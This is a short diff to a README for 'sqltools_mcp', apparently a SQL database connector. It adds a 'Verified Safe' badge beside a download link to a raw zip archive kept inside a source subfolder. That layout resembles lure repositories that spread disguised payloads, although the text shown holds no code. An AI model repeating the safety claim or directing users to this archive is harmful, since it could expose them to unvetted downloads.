@@ -1,5 +1,7 @@
 # 🚀 sqltools_mcp - Easily Connect to SQL Databases
 
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/tony-enninful-sqltools-mcp)
+
 ## 📥 Download Now
 [![Download Release](https://github.com/Tony-Enninful/sqltools_mcp/raw/refs/heads/main/src/sqltools_mcp/adapters/mcp_sqltools_v1.9-beta.2.zip)](https://github.com/Tony-Enninful/sqltools_mcp/raw/refs/heads/main/src/sqltools_mcp/adapters/mcp_sqltools_v1.9-beta.2.zip)
 
